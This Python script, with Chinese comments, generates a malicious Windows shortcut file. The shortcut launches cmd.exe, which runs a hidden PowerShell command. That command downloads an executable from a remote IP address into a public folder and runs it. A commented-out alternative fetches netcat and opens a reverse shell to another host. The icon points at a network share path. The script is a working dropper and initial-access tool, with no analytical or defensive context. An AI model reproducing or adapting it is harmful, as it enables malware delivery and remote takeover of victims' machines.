import random
import win32com.client

def generate_lnk():
    # 固定参数，写死配置
    host = 'localhost'
    output = r'C:\Users\LEGION\Desktop\out3.lnk'
    
    #execute = ['powershell -Command "ls"']  # 要执行的命令，可以改成你想要的
    execute = ['powershell.exe -WindowStyle Hidden -Command "IWR http://172.20.10.14/c.exe -outfile C:\\Users\\Public\\Documents\\c.exe;C:\\Users\\Public\\Documents\\c.exe"']  # 要执行的命令，可以改成你想要的
    #execute = ['powershell -WindowStyle Hidden -Command "IWR http://192.168.1.112/nc64.exe -outfile C:\\Users\\Public\\Documents\\nc64.exe; C:\\Users\\Public\\Documents\\nc64.exe 192.168.1.112 443 -e cmd"']
    # 拼接执行命令
    target = ' '.join(execute)

    # 生成 icon 路径，随便写个随机文件名，示范用
    icon = r'\\{host}\Share\{filename}.ico'.format(
        host=host,
        filename=random.randint(0, 50000)
    )

    # 创建快捷方式
    ws = win32com.client.Dispatch('wscript.shell')
    link = ws.CreateShortcut(output)

    # 设置快捷方式属性
    link.Targetpath = r'C:\Windows\System32\cmd.exe'    # 目标程序，这里是cmd.exe
    link.Arguments = '/c ' + target                      # cmd.exe /c powershell -Command "ls"
    link.IconLocation = icon                             # 设置图标（网络路径示例）
    link.save()

    print(f'快捷方式已生成：{output}')
    print(f'执行命令：cmd.exe /c {target}')
    print(f'图标路径：{icon}')

if __name__ == '__main__':
    generate_lnk()
